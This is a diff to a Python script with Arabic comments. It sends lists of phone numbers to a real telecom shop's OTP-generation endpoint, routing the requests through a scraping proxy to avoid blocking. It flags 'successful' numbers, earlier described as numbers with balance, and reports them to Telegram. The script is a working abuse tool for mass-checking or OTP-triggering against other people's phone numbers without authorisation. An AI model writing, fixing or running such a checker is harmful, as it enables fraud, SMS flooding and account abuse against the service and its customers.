@@ -1,6 +1,6 @@
 import requests
 import time
-import random
+import json
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # User-Agents
@@ -25,47 +25,50 @@ def check_phone(phone_number, index, total):
     try:
         time.sleep(DELAY)
         
-        # الطريقة الصحيحة: استخدام ScraperAPI API REQUEST
-        url = 'https://eshop.umniah.com/ar/vendic/index/checkotp/'
+        # الـ URL الصحيحة
+        url = 'https://eshop.umniah.com/ar/vendic/index/checkotp/?form_key=pjWimsiCGndV6EMK'
         
-        # البيانات اللي نبعتها
+        # البيانات JSON
+        json_data = {
+            'phone_number': phone_number,
+            'request': 'generate',
+            'orderid': '727965'
+        }
+        
+        # طلب ScraperAPI
         payload = {
             'api_key': SCRAPER_API_KEY,
             'url': url,
-            'method': 'POST',
-            'post_body': f'phone_number={phone_number}&request=generate&orderid=727165'
         }
         
-        # الطلب عبر ScraperAPI
         response = requests.post(
             'https://api.scraperapi.com',
-            data=payload,
+            params=payload,
+            json=json_data,
+            headers={'User-Agent': USER_AGENTS[0]},
             timeout=20
         )
         
         print(f"[{index}/{total}] {phone_number} - Status: {response.status_code}")
-        print(f"[{index}/{total}] Response: {response.text[:200]}")
+        print(f"[{index}/{total}] Response: {response.text[:300]}")
         
         if response.status_code == 200:
             try:
                 result = response.json()
                 
-                if result.get('data1') == 'success':
-                    print(f"[{index}/{total}] ✅ {phone_number} - يوجد رصيد!")
-                    send_telegram(f"✅ {phone_number} - يوجد رصيد!")
+                # تحقق من الرد
+                if 'success' in str(result).lower():
+                    print(f"[{index}/{total}] ✅ {phone_number} - نجح!")
+                    send_telegram(f"✅ {phone_number} - نجح!")
                     remove_from_file(phone_number)
                     return ('success', phone_number)
-                
-                elif 'balance' in str(result.get('data2', '')).lower():
-                    print(f"[{index}/{total}] ❌ {phone_number} - لا يوجد رصيد")
-                    remove_from_file(phone_number)
-                    return ('no_balance', phone_number)
                 else:
-                    print(f"[{index}/{total}] ❓ {phone_number} - رد: {result.get('data2', '')}")
+                    print(f"[{index}/{total}] ❌ {phone_number} - فشل")
                     remove_from_file(phone_number)
-                    return ('unknown', phone_number)
-            except:
-                print(f"[{index}/{total}] ⚠️ {phone_number} - ما يقدر يقرأ JSON")
+                    return ('failed', phone_number)
+                    
+            except Exception as e:
+                print(f"[{index}/{total}] ⚠️ {phone_number} - خطأ JSON: {str(e)[:50]}")
                 remove_from_file(phone_number)
                 return ('json_error', phone_number)
         else:
@@ -88,7 +91,6 @@ def remove_from_file(phone):
             lines = f.readlines()
         with open('lu1.txt', 'w', encoding='utf-8') as f:
             f.writelines([l for l in lines if l.strip() != phone])
-        print(f"تم حذف {phone} من الملف")
     except:
         pass
 
@@ -106,23 +108,23 @@ def main():
         print(f"🚀 بدء الفحص (ScraperAPI)...\n")
         
         success = 0
-        no_balance = 0
         failed = 0
+        errors = 0
         
         for idx, phone in enumerate(phones, 1):
             status, _ = check_phone(phone, idx, total)
             
             if status == 'success':
                 success += 1
-            elif status == 'no_balance':
-                no_balance += 1
-            else:
+            elif status == 'failed':
                 failed += 1
+            else:
+                errors += 1
         
         print(f"\n{'='*50}")
-        print(f"✅ يوجد رصيد: {success}")
-        print(f"❌ لا يوجد رصيد: {no_balance}")
-        print(f"⚠️ أخطاء: {failed}")
+        print(f"✅ نجح: {success}")
+        print(f"❌ فشل: {failed}")
+        print(f"⚠️ أخطاء: {errors}")
         print(f"{'='*50}\n")
 
     except FileNotFoundError:
